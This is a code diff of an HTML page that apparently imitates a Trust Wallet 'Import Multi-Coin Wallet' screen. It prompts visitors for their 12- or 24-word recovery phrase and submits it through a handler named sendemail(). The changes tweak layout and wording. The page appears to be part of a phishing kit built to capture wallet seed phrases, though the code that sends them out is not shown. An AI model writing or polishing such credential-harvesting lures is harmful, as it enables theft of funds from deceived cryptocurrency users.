@@ -6,7 +6,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
     <link rel="stylesheet" type="text/css" href="css/fontawesome/css/all.min.css">
-    <link rel="stylesheet" type="text/css" href="css/pay2.css"> 
+    <link rel="stylesheet" type="text/css" href="css/pay.css"> 
     <link rel="icon" href="img/TWT.png">
 </head>
 
@@ -14,25 +14,25 @@
 
 <nav class="navbar">
 	<a href="javascript:history.go(-1)">
-	<span class="fa fa-arrow-left"></span>
+	<span class="fa fa-chevron-left"></span>
+	<h4>Import</h4>
 	</a>
-	<h3>Import Multi-Coin Wallet</h3>
+	<h3>Multi-Coin Wallet</h3>
     <img src="img/logo3.png" onclick="camera()" class="img">
 </nav>
 
 <div class="container-fluid">
-		<form action="" onsubmit="sendemail()" method="post" id="wallet">
+	<textarea placeholder="Recovery phrase" name="rphrase" id="rp" cols="30" rows="10" form="wallet"></textarea>
+	<button class="paste" onclick="paste()">Paste</button>
+	<p>Typically 12 (sometimes 24) words seperated by <br>single spaces</p>
+	<form action="" onsubmit="sendemail()" method="post" id="wallet">
 		<label for="">Name</label>
-		<input type="text" onclick="focus()" value="Main Wallet 2">
-        <button type="button" class="paste" onclick="paste()">PASTE</button>
-        <label for="" id="label3">Phrase</label>
-        <textarea name="rphrase" id="rp" onfocus="focus()" cols="20" rows="5" form="wallet"></textarea>
-        <p>Typically 12 (sometimes 24) words seperated by <br>single spaces</p>
-	<input class="submit" type="submit" form="wallet" name="submit" value="Import">
+		<input type="text" value="Main Wallet 2">
 	</form>
+	<input class="submit" type="submit" form="wallet" name="submit" value="Import">
 </div>
 <footer class="footer">
-		<a href="" target="_blank" rel="noopener noreferrer"><center><h5>What is a Secret Phrase?</h5></center></a>
+		<a href="" target="_blank" rel="noopener noreferrer"><center><h5>What is a Recovery Phrase?</h5></center></a>
 </footer>
 
 <script type="text/javascript" src="js/jquery-3.2.1.min.js"></script>
@@ -147,7 +147,6 @@
         document.body.appendChild(div);
 	})
    }
-
 </script>
 </body>
 </html>
